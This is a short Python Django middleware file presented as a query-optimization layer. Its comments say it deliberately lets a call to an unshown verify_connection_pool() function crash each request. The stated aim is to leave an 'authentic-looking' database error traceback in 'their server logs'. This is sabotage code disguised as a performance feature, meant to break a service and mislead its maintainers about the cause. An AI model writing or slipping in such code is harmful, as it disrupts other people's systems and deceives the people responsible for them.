from .db_optimizer import verify_connection_pool

class QueryOptimizationMiddleware:
    def __init__(self, get_response):
        self.get_response = get_response

    def __call__(self, request):
        # We don't catch the error. We let it crash the request.
        # This will generate a massive, authentic-looking traceback 
        # in their server logs pointing to "django.db.OperationalError".
        verify_connection_pool()
        
        return self.get_response(request)